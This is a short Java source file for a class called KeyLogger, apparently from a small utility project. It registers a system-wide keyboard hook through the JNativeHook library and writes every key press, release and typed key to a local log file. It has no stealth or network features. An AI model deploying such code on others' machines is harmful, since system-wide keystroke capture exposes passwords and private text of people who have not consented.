package com.util;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener {

    private BufferedWriter writer;
    public Boolean isLogging  = false;
    public String Filename;
    public KeyLogger(String filename){ //Constructor for Keylogger
        try{
            Filename = filename;
            writer = new BufferedWriter(new FileWriter(Filename,true));//Create a writer.
        }catch (IOException e){
            e.printStackTrace();
        }
    }

    public void startLog(){
        try{
            isLogging = true;
            writer = new BufferedWriter(new FileWriter(Filename,true));
            GlobalScreen.registerNativeHook();// regis a "hook" for listening the key/mouse event as level system;
            GlobalScreen.addNativeKeyListener(this);//Recent Object will be the .
        }catch (Exception e){
            System.out.println(e.toString());
        }
    }

    private void logEvent(String event){
        try{
            writer.write(event);
            writer.newLine();
            writer.flush();
        }catch (IOException e){
            e.printStackTrace();
        }
    }
    @Override
    public void nativeKeyPressed(NativeKeyEvent e){
        logEvent("Key Pressed: "+ NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e){
        logEvent("Key Released: "+ NativeKeyEvent.getKeyText(e.getKeyCode()));
    }
    @Override
    public void nativeKeyTyped(NativeKeyEvent e){
        logEvent("Key Typed: "+ NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    public void StopLogging(){
        isLogging = false;
        try {
            GlobalScreen.unregisterNativeHook();//Unregist the Recent hook.
            writer.close();//Close the writer.
        }catch (NativeHookException | IOException e){
            e.printStackTrace();
        }
    }

//    public static void main(String[] args) {
//        KeyLogger keyLogger = new KeyLogger("Text.txt");
//        keyLogger.startLog();
//    }
}
